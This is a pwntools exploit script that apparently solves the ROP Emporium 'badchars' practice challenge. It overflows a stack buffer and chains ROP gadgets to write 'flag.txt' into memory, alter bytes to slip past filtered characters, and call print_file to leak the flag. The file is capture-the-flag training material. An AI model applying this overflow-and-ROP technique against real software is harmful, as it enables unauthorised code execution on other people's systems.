from pwn import *

context(arch="amd64", os="linux", endian="little")
p = process("./badchars")
elf = ELF("./badchars")
rop = ROP(elf)

shellcode =  p64(rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"])[0])
shellcode += b"flag.txt"
shellcode += p64(elf.bss())
shellcode += p64(0x8a)
shellcode += p64(elf.bss() + 2)
shellcode += p64(elf.sym["usefulGadgets"] + 12)
shellcode += p64(elf.sym["usefulGadgets"])

shellcode += p64(rop.find_gadget(["pop r14", "pop r15", "ret"])[0])
shellcode += p64(0x8c)
shellcode += p64(elf.bss() + 3)
shellcode += p64(elf.sym["usefulGadgets"])

shellcode += p64(rop.find_gadget(["pop r14", "pop r15", "ret"])[0])
shellcode += p64(0xc5)
shellcode += p64(elf.bss() + 4)
shellcode += p64(elf.sym["usefulGadgets"])

shellcode += p64(rop.find_gadget(["pop r14", "pop r15", "ret"])[0])
shellcode += p64(0x93)
shellcode += p64(elf.bss() + 6)
shellcode += p64(elf.sym["usefulGadgets"])

shellcode += p64(rop.find_gadget(["pop rdi", "ret"])[0])
shellcode += p64(elf.bss())
shellcode += p64(elf.plt["print_file"])

p.send(b"\x00"*0x28 + shellcode)

p.recvuntil(b"ROPE")
log.success(f"Flag: ROPE{p.recvline().decode()}")
